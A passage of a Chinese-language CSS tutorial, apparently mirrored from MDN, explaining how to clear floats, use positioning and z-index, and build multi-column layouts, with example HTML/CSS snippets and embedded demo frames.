title="清除浮动"></a>清除浮动</h4><p>我们看到，一个浮动元素会被移出正常文档流，且其他元素会显示在它的下方。如果我们不想让剩余元素也受到浮动元素的影响，我们需要 <em>停止</em> 它；这是通过添加 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/clear"><code>clear</code></a> 属性实现的。</p><p>在前例的 HTML 代码中，向浮动元素下方的第二个段落添加 <code>cleared</code> 类，然后向 CSS 文件中添加以下样式：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">.cleared &#123;<br>  <span class="hljs-built_in">clear</span>: <span class="hljs-built_in">left</span>;<br>&#125;<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="清除浮动 sample" id="frame_清除浮动" width="100%" height="600" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Floats/_sample_.%E6%B8%85%E9%99%A4%E6%B5%AE%E5%8A%A8.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p>应该看到，第二个段落已经停止了浮动，不会再跟随浮动元素排布了。<code>clear</code> 属性接受下列值：</p><ul><li><code>left</code>：停止任何活动的左浮动</li><li><code>right</code>：停止任何活动的右浮动</li><li><code>both</code>：停止任何活动的左右浮动</li></ul><h4 id="清除浮动元素周围的盒子"><a href="#清除浮动元素周围的盒子" class="headerlink" title="清除浮动元素周围的盒子"></a>清除浮动元素周围的盒子</h4><p>现在你知道了如何停止浮动元素其后元素的浮动行为。我们来看个例子，如果存在一个盒子 <em>同时</em> 包含了很高的浮动元素和一个很短的段落，会发生什么。</p><h4 id="问题所在"><a href="#问题所在" class="headerlink" title="问题所在"></a>问题所在</h4><p>改变你的文档结构，使得第一个段落与浮动的盒子共同处于类名为 <code>wrapper</code> 的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/div"><code>div</code></a> 元素之下。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">&lt;<span class="hljs-keyword">div</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;wrapper&quot;</span>&gt;<br>  &lt;<span class="hljs-keyword">div</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;box&quot;</span>&gt;<span class="hljs-keyword">Float</span>&lt;/<span class="hljs-keyword">div</span>&gt;<br><br>  &lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla luctus aliquam dolor, eu lacinia lorem placerat vulputate.&lt;/p&gt;<br>&lt;/<span class="hljs-keyword">div</span>&gt;<br></code></pre></td></tr></table></figure><p>在你的 CSS 代码中，为 <code>.wrapper</code> 类添加如下规则并重载页面：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">.<span class="hljs-keyword">wrapper</span> &#123;<br>  background-color: rgb(<span class="hljs-number">79</span>,<span class="hljs-number">185</span>,<span class="hljs-number">227</span>);<br>  padding: <span class="hljs-number">10</span>px;<br>  color: #fff;<br>&#125;<br></code></pre></td></tr></table></figure><p>此外，将原先的 <code>.cleared</code> 类移除：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">.cleared &#123;<br>  <span class="hljs-built_in">clear</span>: <span class="hljs-built_in">left</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>你会看到，就像示例代码一样，如果将背景色属性置于段落上，那么这个背景色将处于浮动元素之下。</p><iframe class="sample-code-frame" title="问题所在 sample" id="frame_问题所在" width="100%" height="600" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Floats/_sample_.%E9%97%AE%E9%A2%98%E6%89%80%E5%9C%A8.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p>再一次强调，这是因为浮动元素处于正常文档流之外，停止紧随其后元素的浮动并不像之前那样奏效。如果你想让盒子联合包住浮动的项目以及第一段文字，同时让紧随其后的内容从盒子中清除浮动，这就是一个问题。</p><p>有三种方法可以处理这个问题，其中的两种在所有浏览器中均可以奏效（虽然看上去有点“小技巧”），剩下的一种是可以处理问题的较新的解决方案。</p><h4 id="clearfix-小技巧"><a href="#clearfix-小技巧" class="headerlink" title="clearfix 小技巧"></a>clearfix 小技巧</h4><p>传统上，这个问题通常由所谓的 “clearfix 小技巧” 解决，其过程为：先向包含浮动内容及其本身的盒子后方插入一些生成的内容，并将生成的内容清除浮动。</p><p>向示例中添加以下 CSS 代码：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">.<span class="hljs-keyword">wrapper</span>::<span class="hljs-keyword">after</span> &#123;<br>  content: &quot;&quot;;<br>  clear: <span class="hljs-keyword">both</span>;<br>  display: block;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在重载页面，盒子的浮动就应该清除了。这与在浮动盒子后手动添加诸如 <code>div</code> 的 HTML 元素，并设置其样式为 <code>clear:both</code> 是等效的。</p><iframe class="sample-code-frame" title="clearfix 小技巧 sample" id="frame_clearfix_小技巧" width="100%" height="600" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Floats/_sample_.clearfix_%E5%B0%8F%E6%8A%80%E5%B7%A7.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h4 id="使用-overflow"><a href="#使用-overflow" class="headerlink" title="使用 overflow"></a>使用 overflow</h4><p>一个替代的方案是将包裹元素的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/overflow"><code>overflow</code></a> 属性设置为除 <code>visible</code> 外的其他值。</p><p>移除上一节添加的 clearfix CSS 代码；在包裹元素上添加 <code>overflow: auto</code> 规则。现在，盒子应该再一次停止浮动。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.wrapper</span> &#123;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgb</span>(<span class="hljs-number">79</span>,<span class="hljs-number">185</span>,<span class="hljs-number">227</span>);<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>  <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;<br>  <span class="hljs-attribute">overflow</span>: auto;<br>&#125;<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="使用 overflow sample" id="frame_使用_overflow" width="100%" height="600" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Floats/_sample_.%E4%BD%BF%E7%94%A8_overflow.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p>这个例子之所以能够生效，是因为创建了所谓的 <strong>块格式化上下文（BFC）</strong>。可以把它看作页面内部包含所需元素的一小块布局区域。如此设置可以让浮动元素包含在 BFC 及其背景之内。大部分情况下这种小技巧都可以奏效，但是可能会出现莫名其妙的滚动条或裁剪阴影，这是使用 overflow 带来的一些副作用。</p><h4 id="display-flow-root"><a href="#display-flow-root" class="headerlink" title="display: flow-root"></a>display: flow-root</h4><p>一个较为现代的方案是使用 <code>display</code> 属性的 <code>flow-root</code> 值。它可以无需小技巧来创建块格式化上下文（BFC），在使用上没有副作用。</p><p>从 <code>.wrapper</code> 中移除 <code>overflow: auto</code> 规则并添加 <code>display: flow-root</code>。如果你的浏览器支持该属性（<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/display#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%BC%E5%AE%B9%E6%80%A7">支持的浏览器列表</a>），盒子就会停止浮动。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.wrapper</span> &#123;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgb</span>(<span class="hljs-number">79</span>,<span class="hljs-number">185</span>,<span class="hljs-number">227</span>);<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>  <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;<br>  <span class="hljs-attribute">display</span>: flow-root;<br>&#125;<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="display flow-root sample" id="frame_display_flow-root" width="100%" height="600" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Floats/_sample_.display_flow-root.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h3 id="2-17-定位"><a href="#2-17-定位" class="headerlink" title="2.17 定位"></a>2.17 定位</h3><p>定位允许你从正常的文档流布局中取出元素，并使它们具有不同的行为，例如放在另一个元素的上面，或者始终保持在浏览器视窗内的同一位置。本文解释的是定位 (<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/position"><code>position</code></a>) 的各种不同值，以及如何使用它们。</p><h4 id="文档流"><a href="#文档流" class="headerlink" title="文档流"></a>文档流</h4><p>定位是一个相当复杂的话题，所以我们深入了解代码之前，让我们审视一下布局理论，并让我们了解它的工作原理。</p><p>首先，围绕元素内容添加任何内边距、边界和外边距来布置单个元素盒子——这就是<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/Building_blocks/The_box_model">盒模型</a> ，我们前面看过。默认情况下，块级元素的内容宽度是其父元素的宽度的 100％，并且与其内容一样高。内联元素高宽与他们的内容高宽一样。你不能对内联元素设置宽度或高度——它们只是位于块级元素的内容中。如果要以这种方式控制内联元素的大小，则需要将其设置为类似块级元素 <code>display: block;</code>。</p><p>这只是解释了单个元素，但是元素相互之间如何交互呢？<strong>正常的布局流</strong>（在布局介绍文章中提到）是将元素放置在浏览器视口内的系统。默认情况下，块级元素在视口中垂直布局——每个都将显示在上一个元素下面的新行上，并且它们的外边距将分隔开它们。</p><p>内联元素表现不一样——它们不会出现在新行上；相反，它们互相之间以及任何相邻（或被包裹）的文本内容位于同一行上，只要在父块级元素的宽度内有空间可以这样做。如果没有空间，那么溢流的文本或元素将向下移动到新行。</p><p>如果两个相邻元素都在其上设置外边距，并且两个外边距接触，则两个外边距中的较大者保留，较小的一个消失——这叫<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Box_Model/Mastering_margin_collapsing">外边距折叠</a>, 我们之前也遇到过。</p><h4 id="介绍-z-index"><a href="#介绍-z-index" class="headerlink" title="介绍 z-index"></a>介绍 z-index</h4><p>所有这些绝对定位很有趣，但还有另一件事我们还没有考虑到 ——当元素开始重叠，什么决定哪些元素出现在其他元素的顶部？在我们已经看到的示例中，我们在定位上下文中只有一个定位的元素，它出现在顶部，因为定位的元素胜过未定位的元素。当我们有不止一个的时候呢？</p><p>尝试添加以下到你的 CSS，使第一段也是绝对定位：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">:nth-of-type</span>(<span class="hljs-number">1</span>) &#123;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">background</span>: lime;<br>  <span class="hljs-attribute">top</span>: <span class="hljs-number">10px</span>;<br>  <span class="hljs-attribute">right</span>: <span class="hljs-number">30px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>此时，你将看到第一段的颜色为绿色，移出文档流程，并位于原始位置上方一点。它也堆叠在原始的 <code>.positioned</code> 段落下，其中两个重叠。这是因为 <code>.positioned</code> 段落是源顺序 (HTML 标记) 中的第二个段落，并且源顺序中后定位的元素将赢得先定位的元素。</p><p>你可以更改堆叠顺序吗？是的，你可以使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/z-index"><code>z-index</code></a>属性。 “z-index”是对 z 轴的参考。你可以从源代码中的上一点回想一下，我们使用水平（x 轴）和垂直（y 轴）坐标来讨论网页，以确定像背景图像和阴影偏移之类的东西的位置。 （0,0）位于页面（或元素）的左上角，x 和 y 轴跨页面向右和向下（适合从左到右的语言，无论如何）。</p><p>网页也有一个 z 轴：一条从屏幕表面到你的脸（或者在屏幕前面你喜欢的任何其他东西）的虚线。<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/z-index"><code>z-index</code></a> 值影响定位元素位于该轴上的位置；正值将它们移动到堆栈上方，负值将它们向下移动到堆栈中。默认情况下，定位的元素都具有 z-index 为 auto，实际上为 0。</p><p>要更改堆叠顺序，请尝试将以下声明添加到 <code>p:nth-of-type(1)</code> 规则中：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">z-index</span>: <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>你现在应该可以看到完成的例子：</p><iframe class="sample-code-frame" title="介绍 z-index sample" id="frame_介绍_z-index" width="100%" height="400" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Positioning/_sample_.%E4%BB%8B%E7%BB%8D_z-index.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p>请注意，z-index 只接受无单位索引值；你不能指定你想要一个元素是 Z 轴上 23 像素—— 它不这样工作。较高的值将高于较低的值，这取决于你使用的值。使用 2 和 3 将产生与 300 和 40000 相同的效果。</p><p><strong>备注：</strong> 你可以在这里看到这个例子 <a href="https://mdn.github.io/learning-area/css/css-layout/positioning/5_z-index.html"><code>5_z-index.html</code></a> (<a href="https://github.com/mdn/learning-area/blob/master/css/css-layout/positioning/5_z-index.html">see source code</a>).</p><h3 id="2-18-多栏布局"><a href="#2-18-多栏布局" class="headerlink" title="2.18 多栏布局"></a>2.18 多栏布局</h3><p>多列布局声明提供了一种多列组织内容的方式，正如你在一些报纸中看到的那样。这篇文章介绍怎么使用这一特性。</p><h4 id="三列布局"><a href="#三列布局" class="headerlink" title="三列布局"></a>三列布局</h4><p>我们从一些很简单的 HTML 开始；用带有类 <code>container</code> 的简单包装，里面是标题和一些段落。</p><p>带有 .container 的 <div> 将成为我们 multicol 的容器。通过这两个属性开启 multicol column-count 或者 column-width (en-US)。 column-count 将创建指定数量的列，所以如果你把下面的 CSS 加到样式表里让后重载入页面，你将得到 3 列：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs axapta">.<span class="hljs-built_in">container</span> &#123;<br>  column-<span class="hljs-keyword">count</span>: <span class="hljs-number">3</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>创建的这些列具有弹性的宽度 — 由浏览器计算出每一列分配多少空间。</p><iframe class="sample-code-frame" title="三列布局 sample" id="frame_三列布局" width="100%" height="400" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Multiple-column_Layout/_sample_.%E4%B8%89%E5%88%97%E5%B8%83%E5%B1%80.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h4 id="设置列宽"><a href="#设置列宽" class="headerlink" title="设置列宽"></a>设置列宽</h4><p>像下面这样使用 <code>column-width</code> 更改 CSS：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">column-width</span>: <span class="hljs-number">200px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>浏览器将按照你指定的宽度尽可能多的创建列；任何剩余的空间之后会被现有的列平分。这意味着你可能无法期望得到你指定宽度，除非容器的宽度刚好可以被你指定的宽度除尽。</p><iframe class="sample-code-frame" title="设置列宽 sample" id="frame_设置列宽" width="100%" height="400" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Multiple-column_Layout/_sample_.%E8%AE%BE%E7%BD%AE%E5%88%97%E5%AE%BD.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h4 id="给多列增加样式"><a href="#给多列增加样式" class="headerlink" title="给多列增加样式"></a>给多列增加样式</h4><p>Multicol 创建的列无法单独的设定样式。不存在让单独某一列比其他列更大的方法，同样无法为某一特定的列设置独特的背景色、文本颜色。你有两个机会改变列的样式：</p><ul><li>使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/column-gap"><code>column-gap</code></a> 改变列间间隙。</li><li>用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/column-rule"><code>column-rule</code></a> 在列间加入一条分割线。</li></ul><p>以上面的代码为例，增加 <code>column-gap</code> 属性可以更改列间间隙。</p><p>你可以尝试不同的值 — 该属性接受任何长度单位。现在再加入 <code>column-rule</code>。和你之前遇到的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border"><code>border</code></a> 属性类似， <code>column-rule</code> 是 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/column-rule-color"><code>column-rule-color</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/column-rule-style"><code>column-rule-style</code></a>的缩写，接受同 <code>border</code> 一样的单位。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">column-count</span>: <span class="hljs-number">3</span>;<br>  <span class="hljs-attribute">column-gap</span>: <span class="hljs-number">20px</span>;<br>  <span class="hljs-attribute">column-rule</span>: <span class="hljs-number">4px</span> dotted <span class="hljs-built_in">rgb</span>(<span class="hljs-number">79</span>, <span class="hljs-number">185</span>, <span class="hljs-number">227</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>尝试设置不同的样式和颜色。</p><iframe class="sample-code-frame" title="给多列增加样式 sample" id="frame_给多列增加样式" width="100%" height="400" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Multiple-column_Layout/_sample_.%E7%BB%99%E5%A4%9A%E5%88%97%E5%A2%9E%E5%8A%A0%E6%A0%B7%E5%BC%8F.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p>值得一提的是这条分割线本身并不占用宽度。它置于用 <code>column-gap</code> 创建的间隙内。如果需要更多空间，你需要增加 <code>column-gap</code> 的值。</p><h4 id="列与内容折断"><a href="#列与内容折断" class="headerlink" title="列与内容折断"></a>列与内容折断</h4><p>多列布局的内容被拆成碎块。和多页媒体上的内容表现大致一样 — 比如打印网页的时候。当你把内容放入多列布局容器内，内容被拆成碎块放进列中，内容折断（译者注：比如断词断句）使得这一效果可以实现。</p><p>有时，这种折断内容会降低阅读体验。在下面的举例中，我用 multicol 对一系列盒子布局，每一小块里有小标题和和一些文字。标题和文字可能被折断点拆开，从而降低阅读体验。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;card&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>I am the heading<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla luctus aliquam dolor, eu lacinia lorem placerat<br>                vulputate. Duis felis orci, pulvinar id metus ut, rutrum luctus orci. Cras porttitor imperdiet nunc, at ultricies<br>                tellus laoreet sit amet. Sed auctor cursus massa at porta. Integer ligula ipsum, tristique sit amet orci<br>                vel, viverra egestas ligula.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;card&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>I am the heading<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla luctus aliquam dolor, eu lacinia lorem placerat<br>                vulputate. Duis felis orci, pulvinar id metus ut, rutrum luctus orci. Cras porttitor imperdiet nunc, at ultricies<br>                tellus laoreet sit amet. Sed auctor cursus massa at porta. Integer ligula ipsum, tristique sit amet orci<br>                vel, viverra egestas ligula.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;card&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>I am the heading<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla luctus aliquam dolor, eu lacinia lorem placerat<br>                vulputate. Duis felis orci, pulvinar id metus ut, rutrum luctus orci. Cras porttitor imperdiet nunc, at ultricies<br>                tellus laoreet sit amet. Sed auctor cursus massa at porta. Integer ligula ipsum, tristique sit amet orci<br>                vel, viverra egestas ligula.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;card&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>I am the heading<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla luctus aliquam dolor, eu lacinia lorem placerat<br>                vulputate. Duis felis orci, pulvinar id metus ut, rutrum luctus orci. Cras porttitor imperdiet nunc, at ultricies<br>                tellus laoreet sit amet. Sed auctor cursus massa at porta. Integer ligula ipsum, tristique sit amet orci<br>                vel, viverra egestas ligula.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;card&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>I am the heading<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla luctus aliquam dolor, eu lacinia lorem placerat<br>                vulputate. Duis felis orci, pulvinar id metus ut, rutrum luctus orci. Cras porttitor imperdiet nunc, at ultricies<br>                tellus laoreet sit amet. Sed auctor cursus massa at porta. Integer ligula ipsum, tristique sit amet orci<br>                vel, viverra egestas ligula.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;card&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>I am the heading<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla luctus aliquam dolor, eu lacinia lorem placerat<br>                vulputate. Duis felis orci, pulvinar id metus ut, rutrum luctus orci. Cras porttitor imperdiet nunc, at ultricies<br>                tellus laoreet sit amet. Sed auctor cursus massa at porta. Integer ligula ipsum, tristique sit amet orci<br>                vel, viverra egestas ligula.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;card&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>I am the heading<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla luctus aliquam dolor, eu lacinia lorem placerat<br>                vulputate. Duis felis orci, pulvinar id metus ut, rutrum luctus orci. Cras porttitor imperdiet nunc, at ultricies<br>                tellus laoreet sit amet. Sed auctor cursus massa at porta. Integer ligula ipsum, tristique sit amet orci<br>                vel, viverra egestas ligula.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">column-width</span>: <span class="hljs-number">250px</span>;<br>  <span class="hljs-attribute">column-gap</span>: <span class="hljs-number">20px</span>;<br>&#125;<br><br><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgb</span>(<span class="hljs-number">207</span>, <span class="hljs-number">232</span>, <span class="hljs-number">220</span>);<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> 